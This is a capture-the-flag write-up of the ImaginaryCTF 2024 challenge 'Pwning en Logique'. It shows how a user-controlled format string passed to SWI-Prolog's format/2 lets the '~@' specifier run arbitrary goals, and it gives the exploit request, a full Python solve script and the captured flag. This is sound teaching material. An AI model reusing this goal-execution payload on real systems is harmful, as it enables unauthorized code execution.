# Pwning en Logique

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 56 solves / 249 points
- Author: @maple3142
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

solved_pwnlog(X) :- '1337haxor'(X).

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723131050.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723143947.png)

In here, it has 3 buttons: "Log in", "Get greeted by the server", and "Get the flag".

Log in page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723144033.png)

Let's try to login to a random account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723144202.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723144210.png)

Hmm... Nope, looks like we need valid credentials.

Greeting page:

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723144319.png)

When we click the "Get greeted by the server", if we're not authenticated, it redirects us to `/login`.

Get the flag page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723144357.png)

Hmm... Only admin can access this page.

Well, there's not much we can do in here, let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/Pwning-en-Logique/pwning_en_logique.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique)-[2024.07.23|14:04:05(HKT)]
└> file pwning_en_logique.tar.gz 
pwning_en_logique.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 10240
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique)-[2024.07.23|14:04:07(HKT)]
└> tar xvzf pwning_en_logique.tar.gz 
server.pl
Dockerfile
```

After reading the source code, we have the following findings:

1. The web application is written in Prolog with [SWI-Prolog](https://www.swi-prolog.org/) environment
2. The web application has 4 routes: `/`, `/login`, `/greet`, and `/flag`

In those 4 routes, their respective callback function is `index`, `login`, `greet`, and `flag`:

```prolog
:- use_module(library(http/http_dispatch)).
[...]
:- http_handler('/', index, []).
:- http_handler('/login', login, []).
:- http_handler('/greet', greet, []).
:- http_handler('/flag', flag, []).
```

Let's dive into those routes!

First off, what's our objective? Where's the flag?

In route `/flag` callback function `flag`, if the username is `admin`, it'll call function `print_flag` to return the flag for us:

```prolog
:- use_module(library(http/http_session)).
:- use_module(library(http/http_client)).
:- use_module(library(http/http_parameters)).
:- use_module(library(http/html_write)).
[...]
flag(_Request) :-
    content_type,
    (http_session_data(username(admin)), print_flag; print_access_denied).
[...]
content_type :- format('Content-Type: text/html~n~n').
print_flag :- format('jctf{red_flags_and_fake_flags_form_an_equivalence_class}').
print_access_denied :- format('<h1>Only the admin can access the flag!</h1>').
```

Hmm... Interesting, **the flag will be returned by function `print_flag`**...

So, maybe we'll need to either escalate our privilege to `admin`, or **somehow call function `print_flag`**?

After reading further, route `/` and `/login` is basically useless for us, except `/greet`.

If we're authenticated, it'll **return the formatted parameters' value `greatting` and `format` to us via function `format/2`**:

```prolog
greet(Request) :-
    http_session_data(username(Username)),
    http_parameters(Request, [
        greeting(Greeting, [default('Hello')]),
        format(Format, [default('~w, ~w!')])
    ]),
    content_type,
    format(Format, [Greeting, Username]).
```

As you can see, `Format` and `Greeting` can be controlled by us.

Hmm... Based on the challenge's title, description, and this `format` function, it makes me feel like this challenge has to do with **format string vulnerability**.

After reading the [documentation of `format/2`](https://www.swi-prolog.org/pldoc/doc_for?object=format/2), we can know that the `Format` must start with the tilde (`~`) special sequence, followed by a character describing the action to be undertaken.

For instance, the following code will format 2 strings with 2 `~w` format specification:

```prolog
?- format('~w~w', ['Foo', 'bar']).
```

Which returns `Foobar`.

However, I found an interesting format specification, which is **`@`**:

> `@` Interpret the next argument as a goal and execute it. Output written to the `current_output` stream is inserted at this place. Goal is called in the module calling [format/3](https://www.swi-prolog.org/pldoc/man?predicate=format/3).[...]

TL;DR: **The `@` format specification allows us to call a function**.

Ah ha! We can send a request as the following:

```http
GET /greet?greeting=print_flag&format=~@~w HTTP/1.1
```

By doing so, **the `@` format specification executes function `print_flag` and returns the flag to us**!!

But wait, how can we to be authenticated in the first place?

**Well, luckily, there's a `guest` account for us!**
```prolog
users([
    guest=guest,
    'AzureDiamond'=hunter2,
    admin=AdminPass
]) :- crypto_n_random_bytes(32, RB), hex_bytes(AdminPass, RB).
```

So, we can use username `guest` password `guest` to login!

## Exploitation

With the above information, we can now exploit the format string vulnerability to get the flag!

- Login as `guest` account

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723151021.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723151030.png)

- Send the following request to get the flag

```http
GET /greet?greeting=print_flag&format=~@~w HTTP/1.1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723151113.png)

Or run the following solve script:

```python
#!/usr/bin/env python3
import requests
import re

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.GUEST_CREDENTIALS = 'guest'
        self.PRINT_FLAG_FUNCTION_NAME = 'print_flag'
        self.FORMAT_PAYLOAD = '~@~w'
        self.FLAG_REGEX = re.compile('(ictf\{.*?\})')

    def login(self):
        url = f'{self.baseUrl}/login'
        data = {
            'username': self.GUEST_CREDENTIALS,
            'password': self.GUEST_CREDENTIALS
        }

        self.session.post(url, data=data)

    def getFlag(self):
        url = f'{self.baseUrl}/greet'
        parameters = {
            'greeting': self.PRINT_FLAG_FUNCTION_NAME,
            'format': self.FORMAT_PAYLOAD
        }

        responseText = self.session.get(url, params=parameters).text
        match = re.search(self.FLAG_REGEX, responseText)
        if match is None:
            print('[-] Unable to read the flag')
            exit(0)

        flag = match.group(0)
        print(f'[+] We got the flag! Flag: {flag}')

    def solve(self):
        self.login()
        self.getFlag()

if __name__ == '__main__':
    baseUrl = 'http://localhost'
    solver = Solver(baseUrl)

    solver.solve()
```

```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique)-[2024.07.23|15:19:28(HKT)]
└> python3 solve.py
[+] We got the flag! Flag: ictf{f0rm4t_5tr1ng_vuln3r4b1l1ty_1n_Prolog_4nd_1t5_n0t_3v3n_4_pwn_ch4ll3ng3}
```

- **Flag: `ictf{f0rm4t_5tr1ng_vuln3r4b1l1ty_1n_Prolog_4nd_1t5_n0t_3v3n_4_pwn_ch4ll3ng3}`**

## Conclusion

What we've learned:

1. Format string vulnerability in Prolog